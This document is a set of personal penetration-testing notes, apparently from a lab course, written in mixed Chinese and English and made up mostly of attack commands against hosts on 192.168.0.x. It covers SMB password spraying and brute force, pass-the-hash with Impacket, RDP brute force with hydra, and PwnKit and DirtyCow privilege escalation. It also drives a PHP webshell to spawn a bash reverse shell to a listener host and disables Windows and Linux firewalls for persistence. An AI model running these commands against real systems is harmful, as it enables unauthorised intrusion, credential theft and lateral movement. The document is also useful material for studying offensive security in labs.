ENUM
===

# SNMP
```bash
sudo nmap 192.168.0.* --open -p161 -sU -oG - | grep Up | cut -d ' ' -f2 > snmp_list

sudo nmap 192.168.0.1 --open -p161 

sudo nmap 192.168.0.1 --open -p161 -sU --reason
```
onesixtyone
```bash
# filite 192.168.0.1
onesixtyone -i snmap_list public
```
snmap-check
```bash
```
帳號速爆
```bash
sudo nmap 192.168.0.20 -p161 -sU -n -Pn --script snmp-win32-users
```

# NetBIOS
> 該被淘汰了win11還是server2022好像有拔除
> 是windows BIOS Software的底層
> NetBT : NetBIOS over TCP/IP
> NetBT : **需要有NetBIOS Name當作獨一無二的節點也就是Computer Name**
```bash
# Server,workstationa(445),Messenger,Computer Browser(網路芳鄰)  可以把這些服務停掉
# NetBIOS
# NetBEUI


# Web,mail,FTP,SSH
# Socket
# TCP/IP
```
```bash
netscan 192.168.0.1-254
```
windows
```bash
# netbios註冊狀態
nbtstat -n
nbtstat -A 192.168.0.7
nbtstat -a $ComputerName

ping $ComputerName
nbtstat -c # Cache
```
```bash
net view /domain

net view /domain:WORKGROUP

net view

net view \\$ComputerName

net use \\$ComputerName Pa$$w0rd /u:administrator

net view \\$ComputerName /all

dir \\$ComputerName/c$
```
Linux
```bash
nbtscan 192.168.0.22 -v

nmblookup $ComputerName
nmblookup -A $IP

smbclient -N -L 192.168.0.22
smbclient -U 'Administrator%Pa$$w0rd' //192.168.0.22/c$
smbclient -U 'Administrator%Pa$$w0rd' //192.168.0.22/c$ -c 'dir'
```
```bash
nmap 192.168.0.* -p445 --open -n -Pn -oG - | grep Up | cut -d ' ' -f2 > ip_smb
```
crackmapexec 爆破smb windows好朋友
```bash
# Impacket
python3 -m pip install --upgrade impacket
python3 -m pip list | grep impacket

# crackmapexec
crackmapexec smb ip_smb -u administrator -p 'Pa$$ew0rd'

# 密碼爆破策略
1.字典攻擊
  固定target 固定帳號 PasswordList
2.Password Spraying
  固定target UserList 固定少數密碼
3.Credential Strring
  targetlist 固定帳號 固定密碼


# 密碼噴灑
crackmapexec smb 192.168.0.7 -u userlist.txt ... --continue-on-success



# 進去
psexec.py 'administrator:Pa$$w0rd'@192.168.0.22


# 密碼雜湊 橫向移動
# get hash
impacket-screctdump 'administrator:Pa$$w0rd'@192.168.0.22
psexec.py 'administrator'@192.168.0.22 -hashes : $hash

# pth-winexe 2016後的機器不好使
前半段其實塞32個字元就可以了不會特別驗
```

# RDP
xfreerdp
```bash
sudo dpkg –l | grep freerdp
# 全部都要2.3version以上
freerdp2-x11
libfreerdp2-2
libfreerdp-client2-2
```
hydra
```bash
hydra rdp://192.168.0.7 -l administrator -p 'Pa$$w0rd'
```
reg
```bash
# 遠桌開關
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```


# SSH
```bash

```

> owaspbwa
> https://code.google.com/archive/p/owaspbwa/wikis/UserGuide.wiki

> Pa$$w0rd123



# Privilledge Escalation
> PayloadsAllTheThings
```bash
sudo -l
# su    切換至目標帳號/需要目標帳號密碼
# sudo  預授權
#        是否需要驗證(自己的密碼)
#        路徑、檔名、參數  ex. /bin/target -i

# (ALL:ALL) ALL
sudo -i
# GTFOBins

```
Pwnkit
```bash
#低版本的通殺提權
uname -a

# ly4k/PwnKit/raw/main/PwnKit
scp PwnKit aleksander@192.168.0.70:~/.
chmod +x PwnKit
./PwnKit

# 一般kernel exploit希望執行的路徑有寫入權限(writable)
# expliot > trigger > vulnerable module > 執行payload > 提權
```
DirtyCow
```bash
# 更低版本的Linux
# https://www.exploit-db.com/exploits/40847
searchsploit -m 40847
scp 40847.cpp aleksander@192.168.0.70:~/.
head 40847.cpp

```

# Egress Busting
```bash
# 先去ubuntu種php webshell

curl 192.168.0.24/shell.php?cmd=id

curl -G 192.168.0.24/shell.php --data-urlencode "cmd=id"


curl -G 192.168.0.24/shell.php --data-urlencode "cmd=bash -c 'bash -i > /dev/tcp/192.168.0.18/8888 0<&1 2>&1'"



# bash -i 互動
# > : 1>
# &1: fd1


# shell != console(TTY 只存在本績 、 pty)
# pty 遠端模擬 tty

# shell : bash dash zsh

script -c /bin/bash -q /dev/null

# console
# stdin  0
# stdout 1
# stderr 2

python2 --version 2> /dev/null
# python2把版號是把輸出放在stderr

# SHELL
# I/O fd
# fd 0  stdin
# fd 1  stdout
# fd 2  stderr

pidof bash
ls - l /proc/98793/fd
```
測反彈port
```bash
sudo tcpdump -ni eth0 tcp[13]==2

echo > /dev/tcp/192.168.0.18/100

for port in {200..210};echo > /dev/tcp/192.168.0.18/$port 2> /dev/null;done

```

# persistent
```bash
# windows關防火牆
netsh advf

netsh advf show allprofiles

netsh advf set allprofiles state off

# Linux
sudo iptables -P INPUT ACCEPT
sudo iptables -P OUTPUT ACCEPT

sudo iptables -F
```
# Other
```bash
### Windows 
dir /s <FILE_NAME> 2> nul 
# content
findstr /n /i /s <KEYWORD> *.*

### Linux 
find / -name <FILE_NAME> –ls 2> /dev/null
find . -iname ssh* 2> /dev/null
grep –nir <KEYWORD> .
```